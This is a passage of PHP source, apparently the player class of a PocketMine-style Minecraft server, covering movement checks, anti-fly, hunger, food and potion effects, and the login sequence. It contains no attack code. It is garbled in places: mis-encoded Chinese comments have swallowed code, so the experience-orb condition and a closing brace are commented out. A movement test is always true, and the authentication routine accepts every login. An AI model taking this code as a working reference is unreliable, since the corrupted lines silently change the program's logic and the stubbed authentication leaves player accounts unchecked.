		$newPos = $this->normalizePartialBlockGroundMovement($this->newPosition);
		$distanceSquared = $newPos->distanceSquared($this);

		$revert = false;

		if($this->server->checkMovement){
			if(($distanceSquared / ($tickDiff ** 2)) > 200){
				$revert = true;
			}else{
				if($this->chunk === null or !$this->chunk->isGenerated()){
					$chunk = $this->level->getChunk($newPos->x >> 4, $newPos->z >> 4, false);
					if($chunk === null or !$chunk->isGenerated()){
						$revert = true;
						$this->nextChunkOrderRun = 0;
					}else{
						if($this->chunk !== null){
							$this->chunk->removeEntity($this);
						}
						$this->chunk = $chunk;
					}
				}
			}
		}else{
			if($this->chunk === null or !$this->chunk->isGenerated()){
				$chunk = $this->level->getChunk($newPos->x >> 4, $newPos->z >> 4, false);
				if($chunk === null or !$chunk->isGenerated()){
					$revert = true;
					$this->nextChunkOrderRun = 0;
				}else{
					if($this->chunk !== null){
						$this->chunk->removeEntity($this);
					}
					$this->chunk = $chunk;
				}
			}
		}

		if(!$revert and $distanceSquared != 0){
			$dx = $newPos->x - $this->x;
			$dy = $newPos->y - $this->y;
			$dz = $newPos->z - $this->z;

			$this->applyProtocol011AutoSprint();

			$this->move($dx, $dy, $dz);

			$diffX = $this->x - $newPos->x;
			$diffY = $this->y - $newPos->y;
			$diffZ = $this->z - $newPos->z;

			$yS = 0.5 + $this->ySize;
			if($diffY >= -$yS or $diffY <= $yS){
				$diffY = 0;
			}

			$diff = ($diffX ** 2 + $diffY ** 2 + $diffZ ** 2) / ($tickDiff ** 2);

			/*if($this->isSurvival()){
				if(!$revert and !$this->isSleeping()){
					if($diff > 0.0625){
						$revert = true;
						$this->server->getLogger()->warning($this->getServer()->getLanguage()->translateString("pocketmine.player.invalidMove", [$this->getName()]));
					}
				}
			}

			if($diff > 0){
				$this->x = $newPos->x;
				$this->y = $newPos->y;
				$this->z = $newPos->z;
				$radius = $this->width / 2;
				$this->boundingBox->setBounds($this->x - $radius, $this->y, $this->z - $radius, $this->x + $radius, $this->y + $this->height, $this->z + $radius);
			}*/
		}

		$from = new Location($this->lastX, $this->lastY, $this->lastZ, $this->lastYaw, $this->lastPitch, $this->level);
		$to = $this->getLocation();

		$delta = pow($this->lastX - $to->x, 2) + pow($this->lastY - $to->y, 2) + pow($this->lastZ - $to->z, 2);
		$deltaAngle = abs($this->lastYaw - $to->yaw) + abs($this->lastPitch - $to->pitch);

		if(!$revert and ($delta > (1 / 16) or $deltaAngle > 10)){

			$isFirst = ($this->lastX === null or $this->lastY === null or $this->lastZ === null);

			$this->lastX = $to->x;
			$this->lastY = $to->y;
			$this->lastZ = $to->z;

			$this->lastYaw = $to->yaw;
			$this->lastPitch = $to->pitch;

			if(!$isFirst){
				$ev = new PlayerMoveEvent($this, $from, $to);
				$this->setMoving(true);

				$this->server->getPluginManager()->callEvent($ev);

				if(!($revert = $ev->isCancelled())){ //Yes, this is intended
					//$teleported = false;
					if($this->server->netherEnabled){
						$this->updateNetherPortalTimer($this->canUseNetherPortalHere() and $this->isInsideOfPortal());
					}

					//	if(!$teleported){
					if($to->distanceSquared($ev->getTo()) > 0.01){ //If plugins modify the destination
						$this->teleport($ev->getTo());
					}else{
						$this->level->addEntityMovement($this->x >> 4, $this->z >> 4, $this->getId(), $this->x, $this->y + $this->getEyeHeight(), $this->z, $this->yaw, $this->pitch, $this->yaw);
					}

					if($this->fishingHook instanceof FishingHook){
						if($this->distance($this->fishingHook) > 33 or $this->inventory->getItemInHand()->getId() !== Item::FISHING_ROD){
							$this->unlinkHookFromPlayer();
						}
					}
					$this->syncDepthStriderMovementSpeed();
					//	}
					//原注��?					if($this->server->expEnabled){
						//* @var \lycore\entity\ExperienceOrb $e *
						foreach($this->level->getNearbyExperienceOrb(new AxisAlignedBB($this->x - 1, $this->y - 1, $this->z - 1, $this->x + 1, $this->y + 2, $this->z + 1)) as $e){
							$experience = $e->takeExperience();
							if($experience > 0){
								$e->close();
								$this->addExperience($experience);
							}
						}
					}//原注��?				}
			}

			if(!$this->isSpectator()){
				$this->checkNearEntities($tickDiff);
			}

			$this->speed = $from->subtract($to);
		}elseif($distanceSquared == 0){
			$this->speed = new Vector3(0, 0, 0);
			$this->setMoving(false);
		}

		if($revert && !$this->isSpectator()){

			$this->lastX = $from->x;
			$this->lastY = $from->y;
			$this->lastZ = $from->z;

			$this->lastYaw = $from->yaw;
			$this->lastPitch = $from->pitch;

			$this->sendPosition($from, $from->yaw, $from->pitch, 1);
			$this->forceMovement = new Vector3($from->x, $from->y, $from->z);
		}else{
			$this->forceMovement = null;
			if($distanceSquared != 0 and $this->nextChunkOrderRun > 20){
				$this->nextChunkOrderRun = 20;
			}
		}

		$this->newPosition = null;
	}

	public function setMotion(Vector3 $mot){
		if(parent::setMotion($mot)){
			if($this->chunk !== null){
				$this->level->addEntityMotion($this->chunk->getX(), $this->chunk->getZ(), $this->getId(), $this->motionX, $this->motionY, $this->motionZ);
				$pk = new SetEntityMotionPacket();
				$pk->entities[] = [0, $mot->x, $mot->y, $mot->z];
				$this->dataPacket($pk);
			}

			if($this->motionY > 0){
				$this->startAirTicks = (-(log($this->gravity / ($this->gravity + $this->drag * $this->motionY))) / $this->drag) * 2 + 5;
			}

			return true;
		}
		return false;
	}


	protected function updateMovement(){

	}

	public $foodTick = 0;

	public $starvationTick = 0;

	public $foodUsageTime = 0;

	protected $moving = false;

	public function setMoving($moving){
		$this->moving = $moving;
	}

	public function isMoving() : bool{
		return $this->moving;
	}

	public function sendAttributes(){
		$entries = $this->attributeMap->needSend();
		if(count($entries) > 0){
			$pk = new UpdateAttributesPacket();
			$pk->entityId = 0;
			$pk->entries = $entries;
			$this->dataPacket($pk);
			foreach($entries as $entry){
				$entry->markSynchronized();
			}
		}
	}

	public function onUpdate($currentTick){
		if(!$this->loggedIn){
			return false;
		}

		$tickDiff = $currentTick - $this->lastUpdate;

		if($tickDiff <= 0){
			return true;
		}

		$this->messageCounter = 2;

		$this->lastUpdate = $currentTick;

		$this->sendAttributes();
		$this->sendLegacy011StatusTip($currentTick);

		if(!$this->isAlive() and $this->spawned){
			++$this->deadTicks;
			if($this->deadTicks >= 10){
				$this->despawnFromAll();
			}
			return true;
		}

		$this->timings->startTiming();

		if($this->spawned){
			if($this->server->netherEnabled){
				if(($this->isCreative() or $this->isSurvival() and $this->server->getTick() - $this->portalTime >= 80) and $this->portalTime > 0){
					$targetLevel = $this->getNetherPortalDestinationLevel();
					if($targetLevel instanceof Level){
						if($this->teleportThroughNetherPortal($targetLevel)){
							$this->fromPos = null;
							$this->armNetherPortalCooldownAfterTransfer();
						}else{
							$this->portalTime = 0;
						}
					}
				}
			}
			$this->processMovement($tickDiff);

			if(!$this->isSpectator()) $this->entityBaseTick($tickDiff);

			if($this->isOnFire() or $this->lastUpdate % 10 == 0){
				if($this->isCreative() and !$this->isInsideOfFire()){
					$this->extinguish();
				}elseif($this->getLevel()->getWeather()->isRainy()){
					if($this->getLevel()->canBlockSeeSky($this)){
						$this->extinguish();
					}
				}
			}

			if($this->server->antiFly){
				if(!$this->isSpectator() and $this->speed !== null){
					if($this->onGround){
						if($this->inAirTicks !== 0){
							$this->startAirTicks = 5;
						}
						$this->inAirTicks = 0;
					}else{
						if(!$this->allowFlight and $this->inAirTicks > 30 and !$this->isSleeping() and $this->getDataProperty(self::DATA_NO_AI) !== 1){
							//expectedVelocity here is not calculated correctly
							//This causes players to fall too fast when bouncing on slime when antiFly is enabled
							$expectedVelocity = (-$this->gravity) / $this->drag - ((-$this->gravity) / $this->drag) * exp(-$this->drag * ($this->inAirTicks - $this->startAirTicks));
							$diff = ($this->speed->y - $expectedVelocity) ** 2;
							if(!$this->hasEffect(Effect::JUMP) and $diff > 4.0 and $expectedVelocity < $this->speed->y and !$this->server->getAllowFlight()){
								$this->setMotion($this->temporalVector->setComponents(0, $expectedVelocity, 0));
								if($this->inAirTicks < 1000){

								}elseif($this->kick("Flying is not enabled on this server")){
									$this->timings->stopTiming();
									return false;
								}
							}
						}
						++$this->inAirTicks;
					}
				}
			}

			if($this->server->foodEnabled){
				if($this->starvationTick >= 20){
					$ev = new EntityDamageEvent($this, EntityDamageEvent::CAUSE_STARVATION, 1);
					if($this->getHealth() > $this->server->hungerHealth) $this->attack(1, $ev);
					$this->starvationTick = 0;
				}
				if($this->getFood() <= 0){
					$this->starvationTick++;
				}

				if($this->isMoving() && $this->isSurvival()){
					if($this->isSprinting()){
						$this->foodUsageTime += 500;
					}else{
						$this->foodUsageTime += 250;
					}
				}

				if($this->foodUsageTime >= 200000 && $this->foodEnabled){
					$this->foodUsageTime -= 200000;
					$this->subtractFood(1);
				}

				if((($currentTick % 80) == 0) and $this->getHealth() < $this->getMaxHealth() && $this->getFood() >= 18 && $this->foodEnabled and !$this->server->isWorldHungerHealthRegenerationDisabled($this->getLevel())){
					$ev = new EntityRegainHealthEvent($this, 1, EntityRegainHealthEvent::CAUSE_EATING);
					$this->heal(1, $ev);
				}

				if($this->foodTick >= $this->server->hungerTimer){
					if($this->foodEnabled){
						if($this->foodDepletion >= 2){
							$this->subtractFood(1);
							$this->foodDepletion = 0;
						}else{
							$this->foodDepletion++;
						}
					}
					$this->foodTick = 0;
				}
				if($this->getHealth() < $this->getMaxHealth()){
					$this->foodTick++;
				}
			}
		}

		$this->checkTeleportPosition();

		$this->timings->stopTiming();

		return true;
	}

	public $eatCoolDown = 0;

	public function eatFoodInHand(){
		if($this->eatCoolDown + 2000 >= time() || !$this->spawned){
			return;
		}

		$items = [ //TODO: move this to item classes
			Item::APPLE => 4,
			Item::MUSHROOM_STEW => 6,
			Item::RABBIT_STEW => 10,
			Item::BEETROOT_SOUP => 5,
			Item::BREAD => 5,
			Item::RAW_PORKCHOP => 2,
			Item::COOKED_PORKCHOP => 8,
			Item::RAW_MUTTON => 2,
			Item::COOKED_MUTTON => 6,
			Item::RAW_BEEF => 3,
			Item::BEETROOT => 3,
			Item::STEAK => 8,
			Item::COOKED_CHICKEN => 6,
			Item::RAW_CHICKEN => 2,
			Item::MELON_SLICE => 2,
			Item::GOLDEN_APPLE => 4,
			Item::ENCHANTED_GOLDEN_APPLE => 4,
			Item::PUMPKIN_PIE => 8,
			Item::CARROT => 3,
			Item::POTATO => 1,
			Item::POISONOUS_POTATO => 1,
			Item::BAKED_POTATO => 5,
			Item::COOKIE => 2,
			Item::RAW_SALMON => 2,
			Item::CLOWN_FISH => 1,
			Item::GOLDEN_CARROT => 1,
			Item::RAW_RABBIT => 1,
			Item::COOKED_RABBIT => 5,
			Item::COOKED_SALMON => 6,
			Item::COOKED_FISH => [
				0 => 5,
				1 => 6
			],
			Item::RAW_FISH => [
				0 => 2,
				1 => 2,
				2 => 1,
				3 => 1
			],
			Item::POTION => 0,
			Item::ROTTEN_FLESH => 4,
			Item::PUFFER_FISH => 2,
			Item::SPIDER_EYE => 2
			
		];

		$slot = $this->inventory->getItemInHand();
		if(isset($items[$slot->getId()]) and $this->isAlive()){
			if($this->getFood() <= 20 and isset($items[$slot->getId()])){
				$this->server->getPluginManager()->callEvent($ev = new PlayerItemConsumeEvent($this, $slot));
				if($ev->isCancelled()){
					$this->inventory->sendContents($this);
					return;
				}

				if($slot instanceof FoodSource){
					$this->server->getPluginManager()->callEvent($ev = new EntityEatItemEvent($this, $slot));
					if($ev->isCancelled()){
						$this->inventory->sendContents($this);
						return;
					}
				}

				$pk = new EntityEventPacket();
				$pk->eid = $this->getId();
				$pk->event = EntityEventPacket::USE_ITEM;
				$this->dataPacket($pk);
				Server::broadcastPacket($this->getViewers(), $pk);

				$amount = $items[$slot->getId()];
				if(is_array($amount)){
					$amount = isset($amount[$slot->getDamage()]) ? $amount[$slot->getDamage()] : 0;
				}
				if($this->getFood() + $amount >= 20){
					$this->setFood(20);
				}else{
					$this->setFood($this->getFood() + $amount);
				}

				--$slot->count;
				$this->inventory->setItemInHand($slot);
				if($slot->getId() === Item::MUSHROOM_STEW or $slot->getId() === Item::BEETROOT_SOUP){
					$this->inventory->addItem(Item::get(Item::BOWL, 0, 1));
				}elseif($slot->getId() === Item::PUFFER_FISH){
					$this->addEffect(Effect::getEffect(Effect::POISON)->setDuration(80 * 2));
					$this->addEffect(Effect::getEffect(Effect::NAUSEA)->setAmplifier(1)->setDuration(15 * 20));
				}elseif($slot->getId() === Item::SPIDER_EYE){
					$this->addEffect(Effect::getEffect(Effect::POISON)->setDuration(80 * 2));
				}elseif($slot->getId() === Item::POISONOUS_POTATO){
					$this->addEffect(Effect::getEffect(Effect::POISON)->setDuration(80 * 2));
				}elseif($slot->getId() === Item::ROTTEN_FLESH){
					if(mt_rand(0, 100) < 80){
						$this->addEffect(Effect::getEffect(Effect::HUNGER)->setAmplifier(0)->setDuration(30 * 20));
					}
				}elseif($slot->getId() === Item::RAW_FISH and $slot->getDamage() === 3){ //Pufferfish
					$this->addEffect(Effect::getEffect(Effect::HUNGER)->setAmplifier(2)->setDuration(15 * 20));
					$this->addEffect(Effect::getEffect(Effect::NAUSEA)->setAmplifier(1)->setDuration(15 * 20));
					$this->addEffect(Effect::getEffect(Effect::POISON)->setAmplifier(3)->setDuration(60 * 20));
				}elseif($slot->getId() === Item::ENCHANTED_GOLDEN_APPLE){
					$this->setFood($this->getFood() + 4);
					$this->addEffect(Effect::getEffect(Effect::HEALTH_BOOST)->setAmplifier(0)->setDuration(2 * 60 * 20));
					$this->addEffect(Effect::getEffect(Effect::REGENERATION)->setAmplifier(4)->setDuration(30 * 20));
					$this->addEffect(Effect::getEffect(Effect::FIRE_RESISTANCE)->setAmplifier(0)->setDuration(5 * 60 * 20));
					$this->addEffect(Effect::getEffect(Effect::DAMAGE_RESISTANCE)->setAmplifier(0)->setDuration(5 * 60 * 20));
					$this->addEffect(Effect::getEffect(Effect::ABSORPTION)->setDuration(2 * 60 * 20));
				}elseif($slot->getId() === Item::GOLDEN_APPLE){
					$this->setFood($this->getFood() + 4);
					$this->addEffect(Effect::getEffect(Effect::HEALTH_BOOST)->setAmplifier(0)->setDuration(2 * 60 * 20));
					$this->addEffect(Effect::getEffect(Effect::REGENERATION)->setAmplifier(1)->setDuration(5 * 20));
				}elseif($slot->getId() == Item::POTION){
					$this->inventory->addItem(Item::get(Item::GLASS_BOTTLE, 0, 1));
					switch($slot->getDamage()){
						case Potion::NIGHT_VISION:
							$this->addEffect(Effect::getEffect(Effect::NIGHT_VISION)->setAmplifier(0)->setDuration(3 * 60 * 20));
							break;
						case Potion::NIGHT_VISION_T:
							$this->addEffect(Effect::getEffect(Effect::NIGHT_VISION)->setAmplifier(0)->setDuration(8 * 60 * 20));
							break;
						case Potion::INVISIBILITY:
							$this->addEffect(Effect::getEffect(Effect::INVISIBILITY)->setAmplifier(0)->setDuration(3 * 60 * 20));
							break;
						case Potion::INVISIBILITY_T:
							$this->addEffect(Effect::getEffect(Effect::INVISIBILITY)->setAmplifier(0)->setDuration(8 * 60 * 20));
							break;
						case Potion::LEAPING:
							$this->addEffect(Effect::getEffect(Effect::JUMP)->setAmplifier(0)->setDuration(3 * 60 * 20));
							break;
						case Potion::LEAPING_T:
							$this->addEffect(Effect::getEffect(Effect::JUMP)->setAmplifier(0)->setDuration(8 * 60 * 20));
							break;
						case Potion::LEAPING_TWO:
							$this->addEffect(Effect::getEffect(Effect::JUMP)->setAmplifier(1)->setDuration(1.5 * 60 * 20));
							break;
						case Potion::FIRE_RESISTANCE:
							$this->addEffect(Effect::getEffect(Effect::FIRE_RESISTANCE)->setAmplifier(0)->setDuration(3 * 60 * 20));
							break;
						case Potion::FIRE_RESISTANCE_T:
							$this->addEffect(Effect::getEffect(Effect::FIRE_RESISTANCE)->setAmplifier(0)->setDuration(8 * 60 * 20));
							break;
						case Potion::SPEED:
							$this->addEffect(Effect::getEffect(Effect::SPEED)->setAmplifier(0)->setDuration(3 * 60 * 20));
							break;
						case Potion::SPEED_T:
							$this->addEffect(Effect::getEffect(Effect::SPEED)->setAmplifier(0)->setDuration(8 * 60 * 20));
							break;
						case Potion::SPEED_TWO:
							$this->addEffect(Effect::getEffect(Effect::SPEED)->setAmplifier(1)->setDuration(1.5 * 60 * 20));
							break;
						case Potion::SLOWNESS:
							$this->addEffect(Effect::getEffect(Effect::SLOWNESS)->setAmplifier(0)->setDuration(1 * 60 * 20));
							break;
						case Potion::SLOWNESS_T:
							$this->addEffect(Effect::getEffect(Effect::SLOWNESS)->setAmplifier(0)->setDuration(4 * 60 * 20));
							break;
						case Potion::WATER_BREATHING:
							$this->addEffect(Effect::getEffect(Effect::WATER_BREATHING)->setAmplifier(0)->setDuration(3 * 60 * 20));
							break;
						case Potion::WATER_BREATHING_T:
							$this->addEffect(Effect::getEffect(Effect::WATER_BREATHING)->setAmplifier(0)->setDuration(8 * 60 * 20));
							break;
						case Potion::POISON:
							$this->addEffect(Effect::getEffect(Effect::POISON)->setAmplifier(0)->setDuration(45 * 20));
							break;
						case Potion::POISON_T:
							$this->addEffect(Effect::getEffect(Effect::POISON)->setAmplifier(0)->setDuration(2 * 60 * 20));
							break;
						case Potion::POISON_TWO:
							$this->addEffect(Effect::getEffect(Effect::POISON)->setAmplifier(0)->setDuration(22 * 20));
							break;
						case Potion::REGENERATION:
							$this->addEffect(Effect::getEffect(Effect::REGENERATION)->setAmplifier(0)->setDuration(45 * 20));
							break;
						case Potion::REGENERATION_T:
							$this->addEffect(Effect::getEffect(Effect::REGENERATION)->setAmplifier(0)->setDuration(2 * 60 * 20));
							break;
						case Potion::REGENERATION_TWO:
							$this->addEffect(Effect::getEffect(Effect::REGENERATION)->setAmplifier(1)->setDuration(22 * 20));
							break;
						case Potion::STRENGTH:
							$this->addEffect(Effect::getEffect(Effect::STRENGTH)->setAmplifier(0)->setDuration(3 * 60 * 20));
							break;
						case Potion::STRENGTH_T:
							$this->addEffect(Effect::getEffect(Effect::STRENGTH)->setAmplifier(0)->setDuration(8 * 60 * 20));
							break;
						case Potion::STRENGTH_TWO:
							$this->addEffect(Effect::getEffect(Effect::STRENGTH)->setAmplifier(1)->setDuration(1.5 * 60 * 20));
							break;
						case Potion::WEAKNESS:
							$this->addEffect(Effect::getEffect(Effect::WEAKNESS)->setAmplifier(0)->setDuration(1.5 * 60 * 20));
							break;
						case Potion::WEAKNESS_T:
							$this->addEffect(Effect::getEffect(Effect::WEAKNESS)->setAmplifier(0)->setDuration(4 * 60 * 20));
							break;
						case Potion::HEALING:
							$this->addEffect(Effect::getEffect(Effect::HEALING)->setAmplifier(0)->setDuration(1));
							break;
						case Potion::HEALING_TWO:
							$this->addEffect(Effect::getEffect(Effect::HEALING)->setAmplifier(1)->setDuration(1));
							break;
						case Potion::HARMING:
							$this->addEffect(Effect::getEffect(Effect::HARMING)->setAmplifier(0)->setDuration(1));
							break;
						case Potion::HARMING_TWO:
							$this->addEffect(Effect::getEffect(Effect::HARMING)->setAmplifier(1)->setDuration(1));
							break;
					}
				}
			}
		}
	}

	public function checkNetwork(){
		if(!$this->isOnline()){
			return;
		}

		if($this->nextChunkOrderRun-- <= 0 or $this->chunk === null){
			$this->orderChunks();
		}

		if(count($this->loadQueue) > 0 or !$this->spawned){
			$this->sendNextChunk();
		}

		if(count($this->batchedPackets) > 0){
			if($this->isProtocol015Player()){
				$this->server->batchPackets([$this], $this->batchedPackets, false);
				$this->batchedPackets = [];
			}else{
				$this->server->batchPackets([$this], $this->batchedPackets, false);
				$this->batchedPackets = [];
			}
		}

	}

	public function canInteract(Vector3 $pos, $maxDistance, $maxDiff = 0.5){
		if($this->distanceSquared($pos) > $maxDistance ** 2){
			return false;
		}

		$dV = $this->getDirectionPlane();
		$dot = $dV->dot(new Vector2($this->x, $this->z));
		$dot1 = $dV->dot(new Vector2($pos->x, $pos->z));
		return ($dot1 - $dot) >= -$maxDiff;
	}

	public function onPlayerPreLogin(){
		$this->server->syncPocketMineConfigLanguageTemplate(false);
		//TODO: implement auth
		$this->tryAuthenticate();
	}

	public function tryAuthenticate(){
		//TODO: implement authentication after it is available
		$this->authenticateCallback(true);
	}

	public function authenticateCallback($valid){

		//TODO add more stuff after authentication is available
		if(!$valid){
			$this->close("", "disconnectionScreen.invalidSession");
			return;
		}

		$this->processLogin();
	}

	public function clearCreativeItems(){
		$this->personalCreativeItems = [];
	}

	public function getCreativeItems() : array{
		return $this->personalCreativeItems;
	}

	public function addCreativeItem(Item $item){
		$this->personalCreativeItems[] = Item::get($item->getId(), $item->getDamage());
	}

	public function removeCreativeItem(Item $item){
		$index = $this->getCreativeItemIndex($item);
		if($index !== -1){
			unset($this->personalCreativeItems[$index]);
		}
	}

	public function getCreativeItemIndex(Item $item) : int{
		foreach($this->personalCreativeItems as $i => $d){
			if($item->equals($d, !$item->isTool())){
				return $i;
			}
		}

		return -1;
	}

	private function moveCreativeItemAfter(array $items, int $itemId, int $afterItemId) : array{
		$movingItem = null;
		$remaining = [];

		foreach($items as $item){
			if($item instanceof Item and $item->getId() === $itemId){
				if($movingItem === null){
					$movingItem = $item;
				}
				continue;
			}

			$remaining[] = $item;
		}

		if($movingItem === null){
			return array_values($remaining);
		}

		$ordered = [];
		$inserted = false;
		foreach($remaining as $item){
			$ordered[] = $item;
			if(!$inserted and $item instanceof Item and $item->getId() === $afterItemId){
				$ordered[] = $movingItem;
				$inserted = true;
			}
		}

		if(!$inserted){
			$ordered[] = $movingItem;
		}

		return $ordered;
	}

	protected function getCreativeInventoryItemsForProtocol(int $protocol) : array{
		$items = array_merge(Item::getCreativeItems(), $this->personalCreativeItems);
		if(ProtocolCompatibility::isProtocol015($protocol)){
			$items = $this->moveCreativeItemAfter($items, Item::CARROT_ON_A_STICK, Item::FISHING_ROD);
			$items = $this->moveCreativeItemAfter($items, Item::PISTON, Item::DISPENSER);
			$items = $this->moveCreativeItemAfter($items, Item::STICKY_PISTON, Item::PISTON);
			$items = $this->moveCreativeItemAfter($items, Item::OBSERVER, Item::STICKY_PISTON);
		}

		foreach($items as $index => $item){
			if($item instanceof Item){
				$items[$index] = ProtocolCompatibility::mapCreativeInventoryItemForProtocol($protocol, $item);
			}
		}

		return array_values($items);
	}

	protected function processLogin(){
		if(!$this->server->isWhitelisted(strtolower($this->getName()))){
			$this->close($this->getLeaveMessage(), "本服务器使用白名单！");

			return;
		}elseif($this->server->getNameBans()->isBanned(strtolower($this->getName())) or $this->server->getIPBans()->isBanned($this->getAddress()) or $this->server->getCIDBans()->isBanned($this->randomClientId)){
			$this->close($this->getLeaveMessage(), TextFormat::RED . "此账��?IP/CID已被封禁，请联系管理员！");

			return;
		}

		if($this->hasPermission(Server::BROADCAST_CHANNEL_USERS)){
			$this->server->getPluginManager()->subscribeToPermission(Server::BROADCAST_CHANNEL_USERS, $this);
		}
		if($this->hasPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE)){
			$this->server->getPluginManager()->subscribeToPermission(Server::BROADCAST_CHANNEL_ADMINISTRATIVE, $this);
		}

		foreach($this->server->getOnlinePlayers() as $p){
			if($p !== $this and strtolower($p->getName()) === strtolower($this->getName())){
				if($p->kick("Logged in from another location") === false){
					$this->close($this->getLeaveMessage(), "Logged in from another location");
					return;
				}
			}elseif($p->loggedIn and $this->getUniqueId()->equals($p->getUniqueId())){
				if($p->kick("Logged in from another location") === false){
					$this->close($this->getLeaveMessage(), "Logged in from another location");
					return;
				}
			}
		}

		$nbt = $this->server->getOfflinePlayerData($this->username);
		$this->playedBefore = ($nbt["lastPlayed"] - $nbt["firstPlayed"]) > 1;
		if(!isset($nbt->NameTag)){
			$nbt->NameTag = new StringTag("NameTag", $this->username);
		}else{
			$nbt["NameTag"] = $this->username;
		}
		if(!isset($nbt->Hunger) or !isset($nbt->Experience) or !isset($nbt->ExpLevel) or !isset($nbt->Health) or !isset($nbt->MaxHealth)){
			$nbt->Hunger = new ShortTag("Hunger", 20);
			$nbt->Experience = new LongTag("Experience", 0);
			$nbt->ExpLevel = new LongTag("ExpLevel", 0);
			$nbt->Health = new ShortTag("Health", 20);
			$nbt->MaxHealth = new ShortTag("MaxHealth", 20);
		}
		$this->food = $nbt["Hunger"];
		$this->setMaxHealth($nbt["MaxHealth"]);
		Entity::setHealth(($nbt["Health"] <= 0) ? 20 : $nbt["Health"]);
		$this->exp = ($nbt["Experience"] > 0) ? $nbt["Experience"] : 0;
		$this->expLevel = ($nbt["ExpLevel"] >= 0) ? $nbt["ExpLevel"] : 0;
		$this->calcExpLevel();
		$this->gamemode = $nbt["playerGameType"] & 0x03;
		if($this->server->getForceGamemode()){
			$this->gamemode = $this->server->getGamemode();
			$nbt->playerGameType = new IntTag("playerGameType", $this->gamemode);
		}
		if(($this->gamemode & 0x01) > 0 and $this->gamemode !== Player::SPECTATOR){
			$this->delayedCreativeGamemode = $this->gamemode;
			$this->gamemode = Player::SURVIVAL;
		}

		$this->allowFlight = $this->isCreative() || $this->isSpectator();
		$this->keepMovement = $this->isSpectator();


		if(($level = $this->server->getLevelByName($nbt["Level"])) === null){
			$this->setLevel($this->server->getDefaultLevel());
			$nbt["Level"] = $this->level->getName();
			$nbt["Pos"][0] = $this->level->getSpawnLocation()->x;
			$nbt["Pos"][1] = $this->level->getSpawnLocation()->y;
			$nbt["Pos"][2] = $this->level->getSpawnLocation()->z;
		}else{
			$this->setLevel($level);
		}

		if(!($nbt instanceof CompoundTag)){
			$this->close($this->getLeaveMessage(), "Invalid player data");

			return;
		}
		$this->loadProtocol011AutoSprintState($nbt);

		$this->achievements = [];

		/** @var ByteTag $achievement */
		foreach($nbt->Achievements as $achievement){
			$this->achievements[$achievement->getName()] = $achievement->getValue() > 0 ? true : false;
		}

		$nbt->lastPlayed = new LongTag("lastPlayed", floor(microtime(true) * 1000));
		if($this->server->getAutoSave()){
			$this->server->saveOfflinePlayerData($this->username, $nbt, true);
		}

		parent::__construct($this->level->getChunk($nbt["Pos"][0] >> 4, $nbt["Pos"][2] >> 4, true), $nbt);
		if($this->protocol011AutoSprint and $this->isProtocol011Player()){
			$this->setSprinting(true);
			$this->syncDepthStriderMovementSpeed();
		}
		$this->loggedIn = true;
		$this->server->addOnlinePlayer($this);

		$this->server->getPluginManager()->callEvent($ev = new PlayerLoginEvent($this, "Plugin reason"));
		if($ev->isCancelled()){
			$this->close($this->getLeaveMessage(), $ev->getKickMessage());

			return;
		}

		if($this->isCreative()){
			$this->inventory->setHeldItemSlot(0);
		}else{
			$this->inventory->setHeldItemSlot($this->inventory->getHotbarSlotIndex(0));
		}

		$pk = new PlayStatusPacket();
		$pk->status = PlayStatusPacket::LOGIN_SUCCESS;
		$this->dataPacket($pk);
		if($this->spawnPosition === null and isset($this->namedtag->SpawnLevel) and ($level = $this->server->getLevelByName($this->namedtag["SpawnLevel"])) instanceof Level){
			$this->spawnPosition = new Position($this->namedtag["SpawnX"], $this->namedtag["SpawnY"], $this->namedtag["SpawnZ"], $level);
		}
		$spawnPosition = $this->getSpawn();

		$pk = new StartGamePacket();
		$pk->protocol = $this->protocol;
		$pk->seed = -1;
		$pk->dimension = ChangeDimensionPacket::getClientDimension($this->level->getDimension());
		$pk->x = $this->x;
		$pk->y = $this->y;
		$pk->z = $this->z;
		$pk->spawnX = (int) $spawnPosition->x;
		$pk->spawnY = (int) $spawnPosition->y;
		$pk->spawnZ = (int) $spawnPosition->z;
		$pk->generator = 1; //0 old, 1 infinite, 2 flat
		$pk->gamemode = $this->gamemode & 0x01;
		$pk->eid = 0; //Always use EntityID as zero for the actual player
		/*$pk = new SetPlayerGameTypePacket();
		$pk->gamemode = $this->gamemode & 0x01;*/
		$this->dataPacket($pk);

		$pk = new SetTimePacket();
		$pk->time = $this->level->getTime();
		$pk->started = $this->level->stopTime == false && !$this->server->isWorldDaylightCycleDisabled($this->level);
		$this->dataPacket($pk);

		$pk = new SetSpawnPositionPacket();
		$pk->x = (int) $spawnPosition->x;
		$pk->y = (int) $spawnPosition->y;
		$pk->z = (int) $spawnPosition->z;
		$this->dataPacket($pk);

		$pk = new SetHealthPacket();
		$pk->health = $this->getHealth();
		$this->dataPacket($pk);

		$pk = new SetDifficultyPacket();
		$pk->difficulty = $this->server->getDifficulty();
		$this->dataPacket($pk);
		$this->server->getLogger()->info($this->getServer()->getLanguage()->translateString("pocketmine.player.logIn", [
			TextFormat::AQUA . $this->username . TextFormat::WHITE,
			$this->ip,
			$this->port,
			TextFormat::GREEN . $this->randomClientId . TextFormat::WHITE,
			$this->id,
			$this->level->getName(),
			round($this->x, 4),
			round($this->y, 4),
			round($this->z, 4)
		]));
		/*if($this->isOp()){
			$this->setRemoveFormat(false);
		}*/
		$creativePacket = $this->createCreativeInventoryPacket();
		$this->dataPacket($creativePacket);
		$this->forceMovement = $this->teleportPosition = $this->getPosition();
	}

	public function getProtocol(){
		return $this->protocol;
	}

	private function loadProtocol011AutoSprintState(CompoundTag $nbt) : void{
		if(!$this->isProtocol011Player()){
			return;
		}

		if(!isset($nbt->Protocol011AutoSprint)){
			$nbt->Protocol011AutoSprint = new ByteTag("Protocol011AutoSprint", 1);
		}

		$this->protocol011AutoSprint = ((int) $nbt["Protocol011AutoSprint"]) > 0;
	}

	public function isProtocol011AutoSprintEnabled() : bool{
		return $this->protocol011AutoSprint;
	}

	public function setProtocol011AutoSprintEnabled(bool $enabled) : void{
		$this->protocol011AutoSprint = $enabled;
		if($this->namedtag instanceof CompoundTag){
			$this->namedtag->Protocol011AutoSprint = new ByteTag("Protocol011AutoSprint", $enabled ? 1 : 0);
		}

		if($this->isProtocol011Player()){
			$this->setSprinting($enabled);
			$this->syncDepthStriderMovementSpeed();
			$this->syncProtocol011AutoSprintClientSpeed();
		}
	}

	public function toggleProtocol011AutoSprint(){
		$this->setProtocol011AutoSprintEnabled(!$this->protocol011AutoSprint);
		return $this->protocol011AutoSprint;
	}

	public function toggleProtocol011Sneak(){
		if(!$this->isProtocol011Player()){
